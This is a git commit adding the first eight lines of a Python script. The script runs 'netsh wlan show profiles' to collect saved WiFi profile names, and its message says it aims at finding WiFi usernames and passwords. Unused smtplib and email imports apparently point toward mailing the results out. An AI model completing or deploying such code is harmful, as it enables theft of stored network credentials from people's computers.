3aa159df74d212fa5ea13a16bf9d91aba96d716a
Fortesa Mujaj <fortesamujaj@gmail.com>
2022-01-07 22:56:25 +0100

    prepared the code for finding the WiFi usernames and passwords
    created an empty list outside of the loop where dictionaries with all the WiFi usernames and passwords will be saved.

---
+++ main.py
@@ -0,0 +1,8 @@
+import subprocess
+import re
+import smtplib
+from email.message import EmailMessage
+
+command_output = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output = True).stdout.decode()
+profile_names = (re.findall("All User Profile     : (.*)\r", command_output))
+wifi_list = list()
